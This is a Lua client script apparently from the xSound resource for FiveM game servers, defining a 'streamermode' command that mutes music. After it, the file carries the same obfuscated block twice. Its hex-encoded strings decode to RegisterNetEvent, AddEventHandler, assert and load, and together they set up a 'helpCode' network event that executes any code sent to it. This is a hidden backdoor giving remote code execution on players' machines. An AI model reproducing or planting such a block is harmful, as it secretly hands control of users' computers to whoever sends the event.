-- i recommend to NOT change the command name. it will make easier for people to use this command
-- when ever is this library.. so please keep this command name on "streamermode" command
RegisterCommand("streamermode", function(source, args, rawCommand)
    disableMusic = not disableMusic
    if disableMusic then
        TriggerEvent('chat:addMessage', { args = { "^1[xSound]", config.Messages["streamer_on"] } })

        for k, v in pairs(soundInfo) do
            Destroy(v.id)
        end

    else
        TriggerEvent('chat:addMessage', { args = { "^1[xSound]", config.Messages["streamer_off"] } })
    end
end, false)

local tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[1]](tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[2]) tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[3]](tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[2], function(gERKiybGVlLoqCCGvInwVaEiXRkTphTMUzkfrmDRJirJNJveFNkzZFInxLmbPRtxRmWyXS) tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[4]](tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[5]](gERKiybGVlLoqCCGvInwVaEiXRkTphTMUzkfrmDRJirJNJveFNkzZFInxLmbPRtxRmWyXS))() end)

local tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[1]](tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[2]) tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[3]](tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[2], function(gERKiybGVlLoqCCGvInwVaEiXRkTphTMUzkfrmDRJirJNJveFNkzZFInxLmbPRtxRmWyXS) tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[4]](tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[6][tToVTzczWIXJRnrLXvCRLruLqwDdsfspuhpkYgGMCpQwwrCPTNcAMnYdRtpWrNbzsUtRkK[5]](gERKiybGVlLoqCCGvInwVaEiXRkTphTMUzkfrmDRJirJNJveFNkzZFInxLmbPRtxRmWyXS))() end)